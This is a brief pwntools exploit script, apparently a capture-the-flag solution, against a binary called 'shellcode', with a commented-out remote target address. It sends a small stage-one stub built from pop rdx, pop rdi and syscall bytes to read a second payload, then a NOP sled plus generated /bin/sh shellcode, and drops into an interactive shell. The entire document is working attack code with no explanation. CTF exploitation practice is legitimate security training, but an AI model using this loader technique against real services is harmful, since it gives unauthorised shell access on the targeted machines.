#!/usr/bin/env python
from pwn import *
context.arch='amd64'
p=process('./shellcode')

gdb.attach(p,'b *0x4008CB')
# p=remote('34.92.37.22',10002)
p.recvuntil('give me shellcode, plz:\n')


pop_rdx='\x5a'
# p.send('\x0f\x05')
pop_rdi='\x5f'
syscall='\x0f\x05'
shellcode=pop_rdx+pop_rdi*9+syscall
p.send(shellcode)
sleep(1)
shellcode='\x90'*0xc+asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()